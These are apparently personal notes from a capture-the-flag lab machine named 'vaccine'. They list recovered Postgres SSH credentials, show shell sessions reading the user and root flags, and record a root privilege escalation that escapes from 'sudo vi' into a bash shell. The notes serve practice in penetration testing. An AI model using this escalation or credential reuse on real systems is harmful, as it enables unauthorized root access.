# Credentials
## Postgres
From [[07 - sqlmap shell(s)]]
- ssh
	- postgres
	- P@s5w0rd!
# user flag
```
postgres@vaccine:~$ pwd
/var/lib/postgresql
postgres@vaccine:~$ ls
11  user.txt
postgres@vaccine:~$ cat user.txt 
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:~$ 

postgres@vaccine:~$ id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
postgres@vaccine:~$ ls -l user.txt && md5sum user.txt 
-r-------- 1 postgres postgres 33 Oct 11  2021 user.txt
b1ce15533e1c60dc8f231f298eea5770  user.txt

```

# root flag
Root escalation is possible using `vi` [[07 - sqlmap shell(s)]]
```
postgres@vaccine:/tmp/ignore$ sudo vi /etc/postgresql/11/main/pg_hba.conf

## in vi, go into command mode, paste, then hit enter
:/bin/bash

root@vaccine:/tmp/ignore# id
uid=0(root) gid=0(root) groups=0(root)

root@vaccine:~# cat root.txt 
dd6e058e814260bc70e9bbdef2715849

root@vaccine:~# ls -l root.txt && md5sum root.txt 
-rw------- 1 root root 33 Feb 25  2020 root.txt
4a7e0487225b1a49151851d680cda393  root.txt

```